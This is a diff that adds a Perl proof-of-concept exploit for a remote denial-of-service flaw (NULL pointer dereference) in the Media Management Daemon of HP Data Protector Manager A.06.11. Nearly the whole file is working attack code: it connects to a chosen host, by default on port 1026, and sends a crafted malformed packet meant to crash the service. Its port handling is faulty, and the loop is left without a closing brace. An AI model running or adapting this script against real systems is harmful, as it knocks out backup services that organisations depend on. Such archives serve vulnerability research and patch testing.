@@ -1,0 +1,50 @@
+#!/usr/bin/perl
+
+# =================================
+# HP Data Protector Manager A.06.11
+# =================================
+#
+# Bug: NULL Pointer Dereference Remote Denial of Service Vulnerability
+#
+# Software: http://h71028.www7.hp.com/enterprise/w1/en/software/information-management-data-protector.html
+#
+# Date: 30/11/2010
+# Author: Pepelux - pepelux[AT]enye-sec[DOT]com
+#                   http://www.enye-sec.org - http://www.pepelux.org
+#
+# Service: mmd.exe (Media Management Daemon)
+# Vulnerable file: \Program Files\OmniBack\bin\MSVCR71.dll
+#
+# MSVCR71.dll:7c350428 mov ax,[edx] caused access violation
+# when attempting to read from 0x00000000
+#
+# Tested on Windows XP SP2
+
+use IO::Socket;
+
+my ($server, $port) = @ARGV ;
+
+unless($ARGV[0] || $ARGV[1]) {
+	print "Usage: perl $0 <host> [port]\n";
+	print "\tdefault port = 1026\n\n";
+	exit 1;
+}
+
+$port = 1026 if ($ARGV[0]);
+
+my $buf = "\x00\x00\x00\x43\xfe\xff\x00\x32\x00\x36\x00\x37\x00\x00\x41\x41".
+		  "\x00\x31\x00\x00\x42\x42\x00\x31\x00\x00\x43\x43\x00\x31\x00\x00".
+		  "\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44".
+		  "\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44".
+		  "\xab\x7b\xde\x7c\x46\x4f\x4f";
+		  
+print "[+] Connecting to $server:$port ...\n";
+
+my $sock1 = new IO::Socket::INET (PeerAddr => $server, PeerPort => $port, Timeout => '10', Proto => 'tcp') or die("Server $server is not available.\n");
+
+while(1) {
+print "[+] Sending malicious packet ...\n";
+print $sock1 "$buf";
+print "\n[x] Server crashed!\n"; 
+exit;
+
